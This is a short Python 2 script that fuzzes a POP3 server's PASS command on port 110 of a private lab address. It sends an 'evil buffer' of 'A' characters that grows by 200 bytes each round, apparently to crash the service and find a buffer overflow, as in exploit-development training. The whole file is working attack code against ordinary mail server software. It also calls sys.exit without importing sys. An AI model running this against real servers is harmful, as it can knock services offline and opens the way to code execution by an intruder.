#!/usr/bin/python
import struct
import socket
import time

remoteip = "172.16.162.136"
size = 100

while True:

    buffer = "A" * size
    print buffer
    print "Fuzzing PASS with %s bytes" %size
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print "\nSending evil buffer..."
        s.connect((remoteip,110))
        data = s.recv(1024)
        print data
	
	s.send('USER eder' +'\r\n')
	data = s.recv(1024)
	print data
	
	s.send('PASS ' + buffer + '\r\n')
	data = s.recv(1024)
	print data
	size = size + 200
	s.close()
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    time.sleep(1)
